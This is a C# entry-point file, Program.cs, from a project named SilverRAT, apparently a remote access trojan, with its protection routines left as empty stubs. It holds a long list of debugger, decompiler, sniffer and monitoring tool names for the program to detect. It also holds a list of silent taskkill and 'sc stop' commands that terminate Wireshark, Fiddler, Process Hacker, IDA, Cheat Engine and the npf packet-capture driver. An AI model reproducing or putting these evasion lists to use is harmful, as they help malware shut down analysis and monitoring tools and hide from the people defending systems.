using SilverRAT.Forms;
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace SilverRAT;

internal static class Program
{
    public static bool RuntimeProcessCheckerProtection = true;

    public static bool RuntimeAntiDebugProtection = true;

    public static bool KillDebuggerProtection = true;

    public static bool KillMaliciousProcess = true;

    public static bool DetectDllInjection;

    public static bool RunSingleThread;

    private static bool _beenInitialized;

    private static readonly string[] BadPList = new string[95]
    {
        "dnspy", "Mega Dumper", "Dumper", "PE-bear", "de4dot", "TCPView", "Resource Hacker", "Pestudio", "HxD", "Scylla",
        "de4dot", "PE-bear", "Fakenet-NG", "ProcessExplorer", "SoftICE", "ILSpy", "dump", "proxy", "de4dotmodded", "StringDecryptor",
        "Centos", "SAE", "monitor", "brute", "checker", "zed", "sniffer", "http", "debugger", "james",
        "exeinfope", "codecracker", "x32dbg", "x64dbg", "ollydbg", "ida -", "charles", "dnspy", "simpleassembly", "peek",
        "httpanalyzer", "httpdebug", "fiddler", "wireshark", "dbx", "mdbg", "gdb", "windbg", "dbgclr", "kdb",
        "kgdb", "mdb", "ollydbg", "dumper", "wireshark", "httpdebugger", "http debugger", "fiddler", "decompiler", "unpacker",
        "deobfuscator", "de4dot", "confuser", " /snd", "x64dbg", "x32dbg", "x96dbg", "process hacker", "dotpeek", ".net reflector",
        "ilspy", "file monitoring", "file monitor", "files monitor", "netsharemonitor", "fileactivitywatcher", "fileactivitywatch", "windows explorer tracker", "process monitor", "disk pluse",
        "file activity monitor", "fileactivitymonitor", "file access monitor", "mtail", "snaketail", "tail -n", "httpnetworksniffer", "microsoft message analyzer", "networkmonitor", "network monitor",
        "soap monitor", "internet traffic agent", "socketsniff", "networkminer", "network debugger"
    };

    private static readonly string[] KillDebugList = new string[20]
    {
        "taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1", "taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1", "sc stop HTTPDebuggerPro >nul 2>&1", "taskkill /FI \"IMAGENAME eq cheatengine*\" /IM * /F /T >nul 2>&1", "taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1", "taskkill /FI \"IMAGENAME eq processhacker*\" /IM * /F /T >nul 2>&1", "taskkill /FI \"IMAGENAME eq fiddler*\" /IM * /F /T >nul 2>&1", "taskkill /FI \"IMAGENAME eq wireshark*\" /IM * /F /T >nul 2>&1", "taskkill /FI \"IMAGENAME eq rawshark*\" /IM * /F /T >nul 2>&1", "taskkill /FI \"IMAGENAME eq charles*\" /IM * /F /T >nul 2>&1",
        "taskkill /FI \"IMAGENAME eq cheatengine*\" /IM * /F /T >nul 2>&1", "taskkill /FI \"IMAGENAME eq ida*\" /IM * /F /T >nul 2>&1", "taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1", "taskkill /FI \"IMAGENAME eq processhacker*\" /IM * /F /T >nul 2>&1", "sc stop HTTPDebuggerPro >nul 2>&1", "sc stop KProcessHacker3 >nul 2>&1", "sc stop KProcessHacker2 >nul 2>&1", "sc stop KProcessHacker1 >nul 2>&1", "sc stop wireshark >nul 2>&1", "sc stop npf >nul 2>&1"
    };

    public static FormSilver Silver;

    public static Logger Login;

    [DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool IsDebuggerPresent();

    [DllImport("psapi.dll")]
    public static extern bool EnumProcessModulesEx(IntPtr hProcess, [In][Out][MarshalAs(UnmanagedType.LPArray, ArraySubType = UnmanagedType.U4)] IntPtr[] lphModule, int cb, [MarshalAs(UnmanagedType.U4)] out int lpcbNeeded, uint dwFilterFlag);

    public static void Guardian()
    {

    }

    private static void SingleThd()
    {

    }

    private static void AntiDebugThread()
    {

    }

    private static void SngldetectDebug()
    {

    }

    private static void MaliciousProcessChecker()
    {

    }



    private static void SnglMalProc()
    {

    }

    private static void KillDebuggers()
    {

    }

    private static void InjectDetectThread()
    {

    }



    [STAThread]
    public static void Main()
    {
        Guardian();

        Application.EnableVisualStyles();
        Application.SetCompatibleTextRenderingDefault(defaultValue: false);
        Login = new Logger();
        Application.Run(Login);
    }
}
